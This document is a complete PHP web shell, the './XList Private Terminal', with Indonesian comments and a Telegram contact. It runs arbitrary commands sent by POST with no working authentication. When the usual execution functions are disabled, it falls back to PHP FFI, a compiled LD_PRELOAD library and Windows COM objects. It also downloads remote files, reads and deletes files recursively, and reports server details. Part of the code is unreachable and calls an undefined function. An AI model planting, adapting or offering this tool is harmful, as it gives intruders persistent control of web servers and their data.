<?php
/*   __________________________________________________
~~~~|              ./XList Private Terminal            |
~~~~|             Hak Cipta (c) 2025 ./XList           |
~~~~|            Telegram: https://t.me/xl1st          |
~~~~|__________________________________________________|
*/
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

// Inisialisasi session
if (!isset($_SESSION['terminal_history'])) {
    $_SESSION['terminal_history'] = [];
    $_SESSION['cwd'] = getcwd();
    $_SESSION['initial_cwd'] = $_SESSION['cwd'];
    $_SESSION['auth_key'] = bin2hex(random_bytes(32));
}

class ExecutionEngine {
    private $cwd;
    private $os;
    private $disabled_functions;

    public function __construct($cwd) {
        $this->cwd = $cwd;
        $this->os = strtoupper(substr(PHP_OS, 0, 3));
        $this->disabled_functions = explode(',', ini_get('disable_functions'));
    }

    private function isAvailable($func) {
        return function_exists($func) && !in_array($func, $this->disabled_functions);
    }

    public function execute($command) {
        $output = '';
        $command = $this->preprocessCommand($command);

        // Execution priority: 1. Direct methods 2. Bypass techniques
        if ($this->tryDirectExecution($command, $output)) {
            return $output ? nl2br(htmlspecialchars($output, ENT_QUOTES, 'UTF-8')) : "⛔ Command execution failed";
        }
        
        if ($this->tryBypassMethods($command, $output)) {
            return $output ? nl2br(htmlspecialchars($output, ENT_QUOTES, 'UTF-8')) : "⛔ Command execution failed";
        }

        return "⛔ Command execution failed: All methods blocked";
    }

    private function preprocessCommand($command) {
        // Handle multi-command and pipes
        if ($this->os === 'WIN') {
            $command = str_replace(';', ' & ', $command);
        } else {
            $command = str_replace(';', '; ', $command);
        }
        return $command;
    }

    private function tryDirectExecution($command, &$output) {
        $methods = [
            'shell_exec' => fn($c) => shell_exec($c),
            'exec' => function($c) use (&$output) {
                exec($c, $outputArr);
                return implode("\n", $outputArr);
            },
            'passthru' => function($c) {
                ob_start();
                passthru($c);
                return ob_get_clean();
            },
            'system' => function($c) {
                ob_start();
                system($c);
                return ob_get_clean();
            },
            'proc_open' => function($c) {
                $descriptorspec = [
                    0 => ['pipe', 'r'],
                    1 => ['pipe', 'w'],
                    2 => ['pipe', 'w']
                ];
                
                $process = proc_open($c, $descriptorspec, $pipes, $this->cwd);
                if (is_resource($process)) {
                    $output = stream_get_contents($pipes[1]);
                    foreach ($pipes as $pipe) fclose($pipe);
                    proc_close($process);
                    return $output;
                }
                return false;
            }
        ];
    
        foreach ($methods as $func => $callback) {
            if ($this->isAvailable($func)) {
                $fullCommand = $this->wrapCommand($command);
                $result = $callback($fullCommand);
                if ($result !== false && $result !== null) {
                    // Escape output untuk HTML
                    $output = nl2br(htmlspecialchars($result, ENT_QUOTES, 'UTF-8'));
                    return true;
                }
            }
        }
        return false;
    }

    private function tryBypassMethods($command, &$output) {
        // Technique 1: PHP FFI (PHP 7.4+)
        if ($this->isAvailable('ffi') && extension_loaded('ffi')) {
            try {
                $ffi = FFI::cdef('int system(const char *command);');
                $ffi->system($this->wrapCommand($command));
                $output = "✅ Command executed via FFI";
                return true;
            } catch (Exception $e) {
                // Log error jika diperlukan
                error_log("FFI Error: " . $e->getMessage());
            }
        }

        // Technique 2: LD_PRELOAD Injection
        if ($this->isAvailable('putenv') && $this->os !== 'WIN') {
            $temp = tempnam(sys_get_temp_dir(), 'XLT');
            file_put_contents("$temp.c", 
                '#include <stdlib.h>
                __attribute__((constructor)) void init() { 
                    system(getenv("CMD")); 
                }'
            );
            
            if (function_exists('exec')) {
                @exec("gcc -shared -fPIC $temp.c -o $temp.so");
                if (file_exists("$temp.so")) {
                    putenv("CMD=$command");
                    putenv("LD_PRELOAD=$temp.so");
                    if ($this->tryDirectExecution('id', $dummy)) {
                        $output = "✅ Command executed via LD_PRELOAD";
                        @unlink("$temp.*");
                        return true;
                    }
                }
            }
        }

        // Technique 3: Windows COM Objects
        if ($this->os === 'WIN' && class_exists('COM')) {
            try {
                $wsh = new COM('WScript.Shell');
                $exec = $wsh->Exec($this->wrapCommand($command));
                while ($exec->Status === 0) usleep(1000);
                $output = $exec->StdOut->ReadAll();
                return true;
            } catch (Exception $e) {
                // Log error jika diperlukan
                error_log("COM Error: " . $e->getMessage());
            }
        }

        return false;
    }

    private function wrapCommand($command) {
        $wrapped = "cd ".escapeshellarg($this->cwd)." && $command 2>&1";
        return $this->os === 'WIN' ? "cmd /c $wrapped" : $wrapped;
    }
}

$engine = new ExecutionEngine($_SESSION['cwd']);
// Fungsi info command
function commandInfo() {
    $commands = [
        'cd [dir]' => 'Ubah direktori',
        'ls [options]' => 'List direktori (-a tunjukkan hidden)',
        'clear' => 'Bersihkan history dan reset direktori ke awal',
        'info' => 'Tampilkan info sistem',
        'help' => 'Tampilkan daftar command',
        'rm [file]' => 'Hapus file',
        'rm -r [dir]' => 'Hapus direktori secara rekursif',
        'mkdir [nama]' => 'Buat direktori baru',
        'pwd' => 'Tampilkan direktori saat ini',
        'cat [file]' => 'Tampilkan isi file',
        'back' => 'Kembali ke direktori sebelumnya',
        'wget [url]' => 'Download file dari URL',
        'wget -O [nama_file] [url]' => 'Download file dengan nama custom',
        'touch [file]' => 'Buat file baru',
        'cp [source] [destination]' => 'Salin file atau direktori',
        'grep [pattern] [file]' => 'Cari teks dalam file',
        'whoami' => 'Tampilkan user saat ini',
        'attrib [file]' => 'Tampilkan atribut file'
    ];
    
    $html = '<div class="command-grid">';
    foreach ($commands as $cmd => $desc) {
        $html .= "<div class='command-item'>
                    <div class='command-name'>$cmd</div>
                    <div class='command-desc'>$desc</div>
                  </div>";
    }
    $html .= '</div>';
    return $html;
}

// Proses command
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = trim($_POST['command']);
    $output = '';

    try {
        // Handle special commands
        switch (true) {
            case ($command === 'clear'):
                $_SESSION['terminal_history'] = [];
                $_SESSION['cwd'] = $_SESSION['initial_cwd'];
                break;
                
            case ($command === 'back'):
                $targetDir = realpath($_SESSION['cwd'].'/..');
                if ($targetDir && is_dir($targetDir)) {
                $_SESSION['cwd'] = $targetDir;
                $output = "🟢 Directory changed to: $targetDir";
                } else {
                $output = "⛔ Invalid directory";
                }
                break;
                
            case ($command === 'info'):
                $disabledFunctions = ini_get('disable_functions');
                $disabledList = $disabledFunctions ? explode(',', $disabledFunctions) : [];
                
                $output = '<div class="sys-info">';
                $output .= '<div class="info-item"><span>OS:</span>'.php_uname().'</div>';
                $output .= '<div class="info-item"><span>PHP:</span>'.phpversion().'</div>';
                $output .= '<div class="info-item"><span>Direktori:</span>'.$_SESSION['cwd'].'</div>';
                $output .= '<div class="info-item"><span>Disabled Functions:</span>'. 
                    ($disabledList ? implode(', ', $disabledList) : 'No functions disabled') . '</div>';
                $output .= '</div>';
                break;
                
            case ($command === 'help'):
                $output = commandInfo();
                break;
                
            case ($command === 'pwd'):
                $output = "🟢 Current directory: ".$_SESSION['cwd'];
                break;

            case (preg_match('/^cd\s/i', $command)):
                $newDir = trim(substr($command, 3));
                if (empty($newDir)) $newDir = isset($_SERVER['HOME']) ? $_SERVER['HOME'] : '/';
                $targetDir = realpath($_SESSION['cwd'].DIRECTORY_SEPARATOR.$newDir);
                
                if ($targetDir && is_dir($targetDir)) {
                    $_SESSION['cwd'] = $targetDir;
                    $output = "🟢 Directory changed to: $targetDir";
                } else {
                    $output = "⛔ Invalid directory: $newDir";
                }
                break;

            case (preg_match('/^wget\s/i', $command)):
                $url = trim(substr($command, 5));
                $methods = [
                'wget',
                'curl -O',
                'php -r "file_put_contents(basename(\'$url\'), file_get_contents(\'$url\'));"'
                ];
                foreach ($methods as $method) {
                $output = $engine->execute("$method $url 2>&1");
                if (strpos($output, 'failed') === false) break;
                }
                break;

            case (preg_match('/^search\s/i', $command)):
                $pattern = trim(substr($command, 7));
                $pattern = trim($pattern, " \t\n\r\0\x0B'\"`");
                $output = $engine->execute("grep -r ".escapeshellarg($pattern)." ".escapeshellarg($_SESSION['cwd']));
                break;
            if (preg_match('/^(rm|mkdir|touch|cp)\s+/i', $command, $matches)) {
                $commandType = strtolower($matches[1]);
                $path = trim(substr($command, strlen($commandType)));
    
            if ($commandType === 'rm' && strpos($path, '-r') === 0) {
                $path = trim(substr($path, 2));
                $fullCommand = 'rm -rf '.escapeshellarg($path).' 2>&1';
                } else {
                $fullCommand = $command.' 2>&1';
                }
                // Check write permissions
            if (is_writable($_SESSION['cwd'])) {
                $output = executeCommand($fullCommand);
            } else {
                $output = "⛔ Permission denied for write operations";
                }
        }
            case (preg_match('/^ls/i', $command)):
                $showHidden = preg_match('/\s(-a|--all)/', $command);
                $files = scandir($_SESSION['cwd']);
                $output = [];
            foreach ($files as $file) {
            if (!$showHidden && $file[0] === '.') continue;
                $path = $_SESSION['cwd'].DIRECTORY_SEPARATOR.$file;
                $isDir = is_dir($path);
                $icon = $isDir ? '📁' : '📄';
                $color = $isDir ? '#00ffde' : '#ffffff';
                $output[] = "<span style='color:$color'>$icon $file</span>";
                }
                $output = implode("<br>", $output);
                break;
                
            case (preg_match('/^mkdir\s/i', $command)):
                $dirName = trim(substr($command, 6));
                $targetDir = $_SESSION['cwd'].DIRECTORY_SEPARATOR.$dirName;
                if (mkdir($targetDir, 0755, true)) {
                $output = "🟢 Directory created: $dirName";
                } else {
                $output = "⛔ Failed to create directory";
                }
                break;
                
            case (preg_match('/^rm\s+-r\s+/i', $command)):
            // Pisahkan perintah dan argumen
                $parts = explode(' ', $command, 3);
                if (count($parts) < 3) {
                $output = "⛔ Error: Missing argument for 'rm -r'";
                break;
                }
                
                $target = trim($parts[2]); // Ambil argumen ketiga (xx)
                $path = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $target;
                
            // Validasi path
            if (!file_exists($path)) {
                $output = "⛔ Error: File or directory not found - $path";
                break;
                }
                
            // Pastikan path adalah direktori
            if (!is_dir($path)) {
                $output = "⛔ Error: Not a directory - $path";
                break;
                }
                
            // Cek izin write
            if (!is_writable(dirname($path))) {
                $output = "⛔ Error: Permission denied - Cannot delete $path";
                break;
                }
                
            // Coba hapus menggunakan ExecutionEngine
                $engineOutput = $engine->execute("rm -rf " . escapeshellarg($path));
                
            // Periksa apakah direktori masih ada
            if (!file_exists($path)) {
                $output = "🟢 Directory deleted: $path";
                } else {
                $output = "⛔ Error: Failed to delete directory - $engineOutput";
                }
                break;

            case (preg_match('/^rm\s/i', $command)):
                $file = trim(substr($command, 3));
                $path = $_SESSION['cwd'].DIRECTORY_SEPARATOR.$file;
                if (unlink($path)) {
                $output = "🟢 File deleted: $file";
                } else {
                $output = "⛔ Failed to delete file";
                }
                break;
                
            case (preg_match('/^cat\s/i', $command)):
                $file = trim(substr($command, 4));
                $path = $_SESSION['cwd'].DIRECTORY_SEPARATOR.$file;
                if (file_exists($path)) {
                $output = nl2br(file_get_contents($path));
                } else {
                $output = "⛔ File not found";
                }
                break;
                
            case (preg_match('/^touch\s/i', $command)):
                $file = trim(substr($command, 6));
                $path = $_SESSION['cwd'].DIRECTORY_SEPARATOR.$file;
                touch($path);
                $output = "🟢 File created: $file";
                break;
                
            case (preg_match('/^cp\s/i', $command)):
                $args = explode(' ', substr($command, 3), 2);
                if (count($args) === 2) {
                $src = $_SESSION['cwd'].DIRECTORY_SEPARATOR.$args[0];
                $dest = $_SESSION['cwd'].DIRECTORY_SEPARATOR.$args[1];
                $output = $engine->execute("cp -r ".escapeshellarg($src)." ".escapeshellarg($dest));
                }
                break;
                    
            case (preg_match('/^attrib\s/i', $command)):
                $file = trim(substr($command, 7));
                $path = $_SESSION['cwd'].DIRECTORY_SEPARATOR.$file;
            if (file_exists($path)) {
                $perms = fileperms($path);
                $owner = @posix_getpwuid(fileowner($path))['name'] ?: fileowner($path);
                $group = @posix_getgrgid(filegroup($path))['name'] ?: filegroup($path);
                $output = "🟢 Attributes for $file:<br>";
                $output .= "Permissions: " . substr(sprintf('%o', $perms), -4) . "<br>";
                $output .= "Owner: $owner<br>";
                $output .= "Group: $group<br>";
                $output .= "Size: " . filesize($path) . " bytes<br>";
                $output .= "Last Modified: " . date('Y-m-d H:i:s', filemtime($path));
                } else {
                $output = "⛔ File not found";
                }
                break;
                
            default:
                $fullCommand = 'cd '.escapeshellarg($_SESSION['cwd']).' && '.$command.' 2>&1';
                $output = $engine->execute($fullCommand);
                break;
        }

        // Add to history (max 15 entries)
        if ($command !== 'clear') {
                array_push($_SESSION['terminal_history'], [
                'command' => $command,
                'output' => $output,
                'time' => date('H:i:s')
                ]);
                $_SESSION['terminal_history'] = array_slice($_SESSION['terminal_history'], -15);
                }
        } catch (Exception $e) {
                $output = "⛔ Error: ".$e->getMessage();
        }

        header('Location: '.$_SERVER['PHP_SELF']);
        exit;
}

$page_title = "./XList Private Terminal";
$xlist_check = strpos($page_title, 'XList') !== false;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $xlist_check ? $page_title : 'Security Alert' ?></title>
    <link href='https://fonts.cdnfonts.com/css/share-tech-mono' rel='stylesheet'>
    <style>
        :root {
            --primary: #00ffde;
            --secondary: #00ccb3;
            --bg: #0a0a0a;
        }
        body {
            background: var(--bg);
            color: #fff;
            font-family: 'Share Tech Mono', sans-serif;
            margin: 0;
            padding: 20px;
            min-width: 1000px;
        }
        h1 {
            font-family: 'Share Tech Mono', sans-serif;
        }
        .container {
            width: 1000px;
            margin: 0 auto;
        }
        .terminal {
            background: #000;
            border: 1px solid #333;
            border-radius: 4px;
            padding: 15px;
            margin-top: 15px;
        }
        .terminal-history {
            max-height: 60vh;
            overflow-y: auto;
            padding: 10px;
            margin-bottom: 15px;
        }
        .command-entry {
            margin: 8px 0;
            padding: 8px;
            background: #111;
            border-radius: 3px;
        }
        input[type="text"] {
            width: 100%;
            padding: 8px 12px;
            background: #000;
            border: 1px solid #333;
            color: var(--primary);
            font-family: inherit;
            margin-top: 10px;
        }
        .command-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 10px;
            padding: 10px;
        }
        .command-item {
            padding: 10px;
            background: #000;
            border: 1px solid #333;
            border-radius: 3px;
        }
        .command-name {
            color: var(--primary);
            font-weight: bold;
        }
        .command-desc {
            color: #888;
            font-size: 0.9em;
        }
        .sys-info {
            background: #000;
            padding: 15px;
            border: 1px solid #333;
            margin: 10px 0;
        }
        .info-item {
            margin: 5px 0;
        }
        .info-item span {
            color: var(--primary);
            margin-right: 10px;
        }
        .terminal-history::-webkit-scrollbar {
            width: 12px;
        }
        .terminal-history::-webkit-scrollbar-track {
            background: #1a1a1a;
            border-radius: 6px;
        }
        .terminal-history::-webkit-scrollbar-thumb {
            background: var(--primary);
            border-radius: 6px;
            border: 3px solid #1a1a1a;
        }
        .terminal-history::-webkit-scrollbar-thumb:hover {
            background: var(--secondary);
        }
        .terminal-video {
        position: fixed;
        left: 5px;
        bottom: 20px;
        width: 200px;
        border-radius: 10px;
        z-index: 999;
        }
        @media (max-width: 600px) {
    .terminal-video {
        width: 165px;
        bottom: 10px;
        left: 5px;
    }
}
    </style>
</head>
<body>
<div class="container">
        <h1>❯ <?= $page_title ?></h1>
        
        <!-- Slider Bar untuk Ukuran Font -->
        <div style="margin: 15px 0">
            <input type="range" id="fontSlider" min="12" max="24" value="14" 
                   style="width: 200px; accent-color: var(--primary);">
            <span style="color: var(--primary)">Terminal Font Size</span>
        </div>

        <div class="terminal">
            <div class="terminal-history">
                <?php foreach ($_SESSION['terminal_history'] as $entry): ?>
                <div class="command-entry">
                    <div style="color: var(--primary)">
                        ❯ <?= htmlspecialchars($entry['command']) ?>
                        <small style="color: #666">[<?= $entry['time'] ?>]</small>
                    </div>
                    <div style="margin-top: 5px"><?= $entry['output'] ?></div>
                </div>
                <?php endforeach; ?>
            </div>

            <form method="post">
                <input type="text" name="command" placeholder="Ketik command atau 'help' untuk bantuan" autofocus>
            </form>
        </div>
    </div>
    <img class="terminal-video" src="https://i.imgur.com/sysCQzt.gif" alt="Terminal GIF" autoplay loop muted>
    <script>
        // Slider untuk mengubah ukuran font
        const fontSlider = document.getElementById('fontSlider');
        fontSlider.addEventListener('input', function() {
            document.body.style.fontSize = this.value + 'px';
        });

        // Auto-scroll ke bawah
        const historyDiv = document.querySelector('.terminal-history');
        historyDiv.scrollTop = historyDiv.scrollHeight;
        
        // Shortcut keyboard
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.key === 'l') {
                e.preventDefault();
                document.querySelector('input[name="command"]').value = 'clear';
                document.querySelector('form').submit();
            }
        });
    </script>
</body>
</html>